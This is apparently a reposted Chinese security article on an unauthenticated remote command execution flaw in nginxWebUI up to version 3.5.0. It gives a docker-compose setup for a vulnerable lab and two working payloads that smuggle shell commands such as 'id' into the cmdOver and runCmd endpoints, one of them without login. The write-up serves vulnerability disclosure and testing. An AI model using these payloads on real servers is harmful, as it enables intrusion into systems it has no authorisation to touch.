<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Rc6xNGSuM9769T4_Hq_IjQ)

**本文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。**

**漏洞说明**

Nginx Web UI 是一个基于 Nginx 的图形化管理界面，用于方便地管理和监控 Nginx 服务器。它提供了一个直观的用户界面，使得用户可以轻松地查看和修改 Nginx 配置文件、监控服务器状态、查看访问日志等。

Nginx Web UI 支持多种操作系统，包括 Windows、Linux 和 macOS。它可以通过下载二进制文件或通过编译源码的方式安装。在安装完成后，用户可以通过浏览器访问 Nginx Web UI 的默认地址 (通常是 http://localhost:8080/)。

使用 Nginx Web UI, 用户可以轻松地完成以下操作：

1.  查看 Nginx 配置文件：用户可以直接在界面上编辑和保存 Nginx 配置文件，也可以查看当前生效的配置文件。
    
2.  监控服务器状态：用户可以实时查看服务器的 CPU、内存、连接数等资源使用情况，以及负载均衡情况。
    
3.  查看访问日志：用户可以查看 Nginx 服务器的访问日志，以便分析网站访问情况和性能问题。
    
4.  添加、删除和修改站点：用户可以在界面上添加、删除和修改网站配置，以适应不同的业务需求。
    
5.  执行命令：用户可以在界面上执行各种 Nginx 命令，如重启服务器、重载配置文件等。
    

总之，Nginx Web UI 是一个非常实用的工具，可以帮助用户更方便地管理和监控 Nginx 服务器，提高服务器的稳定性和性能。

> nginxWebUI 后台提供执行 nginx 相关命令的接口，由于未对用户的输入进行过滤，导致可在后台执行任意命令。并且该系统权限校验存在问题，导致存在权限绕过，在前台可直接调用后台接口，最终可以达到无条件远程命令执行的效果。
> 
> 公众号：长亭安全应急响应中心[在野 0day 捕获｜nginxWebUI runCmd 远程命令执行漏洞](https://mp.weixin.qq.com/s/RjT-hfd-Wathve-XtiiDbQ)

**影响版本**

```
nginxWebUI <= 3.5.0

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbW9SHoSkRpEvrjEVm0txjEeDtS0NxXCHFZDWZ30oCw0tA0Jlhmythqakmict4RrhuMicQmObta5Eohg/640?wx_fmt=png)

NginxWebUI 环境搭建：docker-compose.yml

```
version: "3.2"
services:
  nginxWebUi-server:
    image: cym1102/nginxwebui:3.5.0
    volumes:
      - type: bind
        source: "/home/nginxWebUI"
        target: "/home/nginxWebUI"
    environment:
      BOOT_OPTIONS: "--server.port=8080"
    privileged: true
    network_mode: "host"

```

**后台命令执行：**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbW9SHoSkRpEvrjEVm0txjEeDsMa78rQ1w7n4KC0RqOGBqwf5SvLY3tzsgEdaNsYmW3y83ohfmb11A/640?wx_fmt=png)

payload:

```
POST //adminPage/remote/cmdOver HTTP/1.1
Host: ip:port
Content-Length: 38
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://ip:port
Referer: http://ip:port/adminPage/remote
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_8acef669ea66f479854ecd328d1f348f=1687922667; SOLONID=e8cfe02c326c4859a34d77725ebccbda; SOLONID2=653874842db8f979af9774d85abae8c6; Hm_lpvt_8acef669ea66f479854ecd328d1f348f=1687927485
Connection: close
remoteId=local&cmd=start|id&interval=1

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbW9SHoSkRpEvrjEVm0txjEeDcXGyYg4oS9PBy79oQPH89AAaUA1F4OhNMVSkHj4TMYcr8KQ5SytvQ/640?wx_fmt=png)

**前台命令执行：**  

payload:  

```
/AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbW9SHoSkRpEvrjEVm0txjEexicPBvaNiax4qzCvJz2JXQricby0JfY9OYUqcp38PL13jehELHicAjpgEA/640?wx_fmt=png)

**修复建议**  

升级至安全版本  

本文章仅用于学习交流，不得用于非法用途

星标加关注，追洞不迷路